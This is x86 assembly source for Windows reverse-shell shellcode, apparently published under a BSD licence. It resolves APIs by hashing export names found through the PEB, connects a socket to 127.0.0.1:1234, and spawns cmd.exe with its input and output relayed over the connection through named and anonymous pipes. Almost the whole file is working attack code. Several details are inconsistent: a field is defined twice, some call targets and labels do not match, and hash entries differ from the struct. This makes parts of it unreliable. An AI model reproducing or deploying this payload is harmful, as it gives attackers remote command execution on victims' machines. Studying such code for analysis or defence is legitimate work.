;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;  
  
  %define FD_MAX_EVENTS 10
  
  struc WSANETWORKEVENTS
    lNetworkEvents resd 1
    iErrorCode     resd FD_MAX_EVENTS
  endstruc
  
  struc OVERLAPPED
    Internal     resd 1
    InternalHigh resd 1
    Pointer      resd 1
    Offset       equ Pointer
    OffsetHigh   equ Pointer
    hEvent       resd 1    
  endstruc
  
  struc PROCESS_INFORMATION
    hProcess    resd 1
    hThread     resd 1
    dwProcessId resd 1
    dwThreadId  resd 1
  endstruc
  
  struc STARTUPINFO
    cb              resd 1
    lpReserved      resd 1
    lpDesktop       resd 1
    lpTitle         resd 1
    dwX             resd 1
    dwY             resd 1
    dwXSize         resd 1
    dwYSize         resd 1
    dwXCountChars   resd 1
    dwYCountChars   resd 1
    dwFillAttribute resd 1
    dwFlags         resd 1
    wShowWindow     resw 1
    cbReserved2     resw 1
    lpReserved2     resd 1
    hStdInput       resd 1
    hStdOutput      resd 1
    hStdError       resd 1
  endstruc
  
  ; data structure
  struc ds_tbl
    @ne      WSANETWORKEVENTS_size
    @p       resd 1
    @lap     OVERLAPPED_size
    @len     resd 1
    @out1    resd 1
    @in0     resd 1
    @in1     resd 1
    @out0    resd 1
    @evt0    resd 1
    @evt1    resd 1
    @si      resb STARTUPINFO_size
    @pi      equ @si    
    @len     resd 1
    @buf     resb BUFSIZ+64
  endstruc
  
  ; code structure
  struc cs_tbl
    ; kernel32
    @TerminateProcess       resd 1
    @CreateProcess          resd 1
    @CreateEvent            resd 1
    @WaitForMultipleObjects resd 1
    @CloseHandle            resd 1
    @WriteFile              resd 1
    @ReadFile               resd 1
    @GetOverlappedResult    resd 1
    @CreateFile             resd 1
    @CreatePipe             resd 1
    @CreateNamedPipe        resd 1
    
    ; ws2_32 
    @socket                 resd 1
    @connect                resd 1
    @send                   resd 1
    @recv                   resd 1
    @WSAEventSelect         resd 1  
    @WSACreateEvent         resd 1
    @WSAEnumNetworkEvents   resd 1 
    @ioctlsocket            resd 1
  endstruc  
  
main:
_main:
      pushad 
      mov    ecx, ds_tbl_size+cs_tbl_size
      sub    esp, ecx      
      mov    edi, esp
      
      lodsb                        ; eax = number of hashes
      xchg   eax, ecx
init_api:                        ; do {
      lodsd                        ;   get 32-bit hash
      call   getapi32              ;   resolve API address
      test   eax, eax
      jz     exit_init
      stosd                        ;   save
      loop   init_api              ; } while (--ecx)
      
      lea    ebp, [edi+sizeof(DWORD)*4]
      
      push   ecx                   ; IPPROTO_IP
      mov    cl, x.@len and 255
      lea    esi, [ebp+ecx]
      xor    edi, edi
    
      ; s=socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
      push   1                     ; SOCK_STREAM
      push   2                     ; AF_INET
      xcall  @socket
      xchg   eax, ebx
      test   ebx, ebx              ; if (eax<=0) goto exit_init;
      jle    exit_init
    
      push   0x0100007f        ; sa.sin_addr=127.0.0.1
      push   0xD2040002        ; sa.sin_port=htons(1234)
                               ; sa.sin_family=AF_INET
      mov    ecx, esp          ; ecx = &sa
    
      ; connect (s, &sin, sizeof (sin));
      push   16                    ; sizeof (sin)
      push   ecx                   ; &sin
      push   ebx                   ; s
      xcall  @connect
      pop    ecx
      pop    ecx
      inc    eax                   ; if (eax==SOCKET_ERROR) goto close_socket;
      jz     close_socket          
     
      ; execute cmd.exe
      call   exec_cmd    
 
close_socket:
      ; closesocket (s);
      push   @s
      xcall  @closesocket
    
exit_init:
      sub    esp, -STACK_SIZE
      popad
      ret

      ; ws2_32
      hw HASH("socket")
      hw HASH("connect")
      hw HASH("closesocket")
      hw HASH("send")
      hw HASH("recv")
      hw HASH("WSAEventSelect")
      hw HASH("WSACreateEvent")
      hw HASH("WSAEnumNetworkEvents")
      hw HASH("ioctlsocket")

      ; kernel32
      hw HASH("CreateNamedPipeA")
      hw HASH("CreatePipe")
      hw HASH("CreateFileA")
      hw HASH("GetOverlappedResult")
      hw HASH("ReadFile")
      hw HASH("WriteFile")
      hw HASH("CloseHandle")
      hw HASH("WaitForMultipleObjects")
      hw HASH("CreateEventA")
      hw HASH("CreateProcessA")
      hw HASH("TerminateProcess")

      ; advapi32
      hw HASH("RtlGenRandom")

; ******************************************************** 
get_api:
    assume fs:nothing

    pushad
    push   30h
    pop    esi
    lods   dword ptr fs:[esi]
    mov    eax, [eax+0Ch]
    mov    esi, [eax+1Ch]
load_dll:
    mov    ebp, [esi+08h]
    test   ebp, ebp
    jz     exit_getapi
load_next:
    lodsd
    push   eax

    mov    eax, [ebp+3Ch]
    mov    eax, [ebp+eax+78h] 
    lea    esi, [ebp+eax+18h]
    lodsd
    xchg   eax, ecx
    jecxz  load_dll

    lodsd
    add    eax, ebp
    push   eax

    lodsd
    lea    edi, [ebp+eax]

    lodsd
    lea    ebx, [ebp+eax]
load_api:
    mov    esi, [edi+4*ecx-4]
    add    esi, ebp
    xor    eax, eax
    cdq
hash_api:
    lodsb
    add    edx, eax
    rol    edx, ROL_CONSTANT
    xor    edx, eax
    dec    eax
    jns    hash_api

    cmp  edx, [esp+8+_eax]
    
    loopne load_api
    
    pop    eax
    pop    esi
    jne    load_dll

    movzx  edx, word ptr [ebx+2*ecx]
    add    ebp, [eax+4*edx]
exit_getapi:
    mov    [esp+_eax], ebp
    popad
    ret
    

; ******************************************************** 
wait_evt:
    pushad

    lea    esi, [ebp+@evt0]
    mov    eax, [ebp+@evt0]
    cdq
    
    ; ioctlsocket (s, FIONBIO, &off=0);
    push   edx                   ; 0
    push   esp                   ; &off
    push   8004667Eh             ; FIONBIO
    push   ebx                   ; s
    
    ; WSAEventSelect (s, evts[0], 0);
    push   edx                   ; 0
    push   eax                   ; evts[0]
    push   ebx                   ; s
    
    ; WSAEnumNetworkEvents (s, evts[0], &ne);
    push   ebp                   ; &ne
    push   eax                   ; evts[0]
    push   ebx                   ; s
    
    ; WaitForMultipleObjects (3, evts, FALSE, INFINITE) - WAIT_OBJECT_0;
    push   -1                    ; INFINITE
    push   edx                   ; FALSE
    push   esi                   ; &evts
    push   3   ; number of events to monitor
    
    ; WSAEventSelect (s, evts[0], FD_READ | FD_CLOSE);
    push   21h                   ; FD_READ or FD_CLOSE
    push   eax                   ; evts[0]
    push   ebx                   ; s
    xcall  @WSAEventSelect
    xcall  @WaitForMultipleObjects
    xchg   eax, edi              ; esi = event index
    xcall  @WSAEnumNetworkEvents
    xcall  @WSAEventSelect
    xcall  @ioctlsocket
    pop    edx                   ; remove &off
    
    ; if (ne.lNetworkEvents & FD_CLOSE) {
    ;   break;
    ; }    
    mov    esi, ebp
    lodsd
    test   al, FD_CLOSE
    mov    [esp+_edi], edi
    popad
    ret

; ********************************************************    
exec_cmd:
    pushad                       ; save all
    lea    edi, [ebp+@out1]
    push   edi                   ; save for closing handles on exit
    
    ; create event for hStdOutput of cmd.exe, signalled / auto reset
    ; CreateEvent (NULL, TRUE, TRUE, NULL);
    push   eax                   ; NULL
    push   ebx                   ; TRUE
    push   ebx                   ; TRUE
    push   eax                   ; NULL
    
    ; SECURITY_ATTRIBUTES sa={sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    push   ebx                   ; TRUE
    push   eax                   ; NULL
    push   SECURITY_ATTRIBUTES_size
    mov    esi, esp
    
    ; "\\.\pipe\1"
    push   not SWAP32("\1") shr 16
    push   SWAP32("pipe")
    push   SWAP32("\\.\")
    mov    ecx, esp
    
    ; CreateFileA ("\\\\.\\pipe\\1", MAXIMUM_ALLOWED, 0, &sa, OPEN_EXISTING, 0, NULL);
    push   eax                   ; NULL
    push   eax                   ; 0
    push   3h                    ; OPEN_EXISTING
    push   esi                   ; &sa
    push   eax                   ; 0
    push   2000000h          ; MAXIMUM_ALLOWED
    push   ecx                   ; "\\\\.\\pipe\\1", 0
    
    ; CreateNamedPipeA ("\\\\.\\pipe\\1", PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
    ;    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 
    ;    PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);      
    push   eax                   ; NULL
    push   eax                   ; 0
    push   eax                   ; 0
    push   eax                   ; 0
    push   1                   ; 1 here, PIPE_UNLIMITED_INSTANCES=255
    push   eax                   ; PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT
    push   40000003h         ; PIPE_ACCESS_DUPLEX or FILE_FLAG_OVERLAPPED
    push   ecx                   ; "\\\\.\\pipe\\1", 0
    xcall  @CreateNamedPipeA
    stosd                        ; save out[1]
    cdq
    
    ; CreatePipe (&in[1], &in[0], &sa, 0);
    push   edx                   ; 0
    push   esi                   ; &sa
    push   edi                   ; &in[0]
    scasd                        ; edi += 4
    push   edi                   ; &in[1]
    mov    esi, edi              ; esi = &in[1]
    scasd                        ; edi += 4
    xcall  @CreatePipe           ; should return TRUE    
    xcall  @CreateFileA
    stosd                        ; save out[0]
    add    esp, SECURITY_ATTRIBUTES_size + 3*4
    
    ; create event for socket read and close events
    xcall  @WSACreateEvent
    stosd                        ; save evts[0]
    
    xcall  @CreateEventA
    stosd                        ; save evts[1]
    mov    [ebp+@lap+hEvent], eax
    cdq
    
    ; "cmd", 0
    push   SWAP32("cmd") shr 8
    mov    eax, esp
    
    ; CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    push   edi                   ; &pi
    push   edi                   ; &si
    push   edx                   ; NULL
    push   edx                   ; NULL
    push   edx                   ; 0
    push   ebx                   ; TRUE
    push   edx                   ; NULL
    push   edx                   ; NULL
    push   eax                   ; "cmd", 0
    push   edx                   ; NULL
    
    push   STARTUPINFO_size
    pop    dword [edi+cb]
    inc    dword [edi+dwFlags+1] ; STARTF_USESTDHANDLES
    
    lea    edi, [edi+@si+hStdInput]
    movsd                        ; si.hStdInput = in[1];
    lodsd                        ; eax = out[0]
    stosd                        ; si.hStdOutput = out[0]
    stosd                        ; si.hStdError  = out[0]
    xcall  @CreateProcessA
    pop    eax                   ; remove "cmd", 0
    mov    esi, edi
cmd_loop:
    pushad                       ; save all
    
    ; wait for events
    call   wait_evt
    jnz    cmd_cleanup           ; socket closed

    ; zero signal indicates data received on socket
    test   edi, edi
    jz     receive_data          ; evts[0] ?
    
    ; if not 1, assume it's cmd.exe terminating or undefined error
    dec    edi
    jnz    cmd_cleanup

    ; if (pending == 0) goto read_data;
    cmp    dword [ebp+@p], edi
    mov    eax, [ebp+@out1]   ; eax=out[1]
    lea    edx, [ebp+@lap]    ; edx=&lap
    jz     read_data
    
    ; if (!GetOverlappedResult (out[1], &lap, &len, FALSE) break;
    push   edi                   ; FALSE
    push   esi                   ; &len
    push   edx                   ; &lap
    push   eax                   ; out[1]
    xcall  @GetOverlappedResult
    dec    eax
    jnz    cmd_cleanup
    jmp    send_data
read_data:
    ; ReadFile (out[1], buf, BUFSIZ, &len, &lap);
    push   edx                   ; &lap
    push   esi                   ; &len
    push   [ebp+@len]            ; BUFSIZ
    lea    ecx, [esi+4]
    push   ecx                   ; buf
    push   eax                   ; out[1]
    xcall  @ReadFile
    
    inc    dword ptr[ebp+@p]  ; pending++;
send_data:
    mov    ecx, [esi]            ; ecx=len
    jecxz  continue              ; if (len==0) goto continue;
    
    dec    dword ptr[ebp+@p]  ; pending--;

    call   spp_send    
    jg     continue              ; goto continue;
receive_data:
    call   spp_recv                ; if (recv32()<=0) goto cmd_cleanup;
    jle    cmd_cleanup
    
    ; WriteFile (in[0], buf, len, &len, 0);
    push   edi                   ; 0
    push   esi                   ; &len
    lodsd
    push   eax                   ; len
    push   esi                   ; buf
    push   [ebp+@in0]         ; in[0]
    xcall  @WriteFile
continue:
    popad
    jmp    cmd_loop
cmd_cleanup:
    popad

    ; TerminateProcess (pi.hProcess, GetLastError());
    push   ecx
    push   [ebp+@pi+hProcess]
    xcall  @TerminateProcess
    
    ; for (int i=0; i<8; i++) {
    ;   CloseHandle (h[i]);
    ; }
    pop    esi                   ; esi=&h[0];
    push   8
    pop    ebx
close_loop:
    lodsd
    push   eax
    xcall  @CloseHandle
    dec    ebx
    jnz    close_loop

    popad
    ret


